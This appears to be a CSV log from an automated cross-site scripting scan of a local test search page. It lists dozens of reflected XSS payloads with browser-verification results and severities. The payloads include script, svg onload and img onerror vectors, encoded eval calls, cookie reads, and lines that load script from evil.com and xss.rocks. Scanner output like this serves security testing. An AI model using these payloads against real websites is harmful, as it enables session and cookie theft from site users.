Timestamp,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<script>alert('XSS')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<script>alert(""XSS"")</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<script>prompt(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<script>confirm(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<script>alert(document.cookie)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<script>alert(document.domain)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<script>alert(window.origin)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<script src=//xss.rocks/xss.js></script>,RAW_REFLECTION,No,,High
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<script src=https://evil.com/xss.js></script>,RAW_REFLECTION,No,,High
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<svg/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<svg onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<svg><script>alert(1)</script></svg>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<svg><animate onbegin=alert(1) attributeName=x dur=1s>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<svg/onload=alert(String.fromCharCode(88,83,83))>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<svg onload=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<svg onload=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<svg onload=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<svg onload=eval(atob('YWxlcnQoMSk='))>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<svg><script>alert&#40;1&#41;</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<img src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<img src=x onerror=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<img src=x onerror=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<img src=x onerror=alert('XSS')>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<img src=x onerror=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<img src=x onerror=alert(document.cookie)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<img/src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
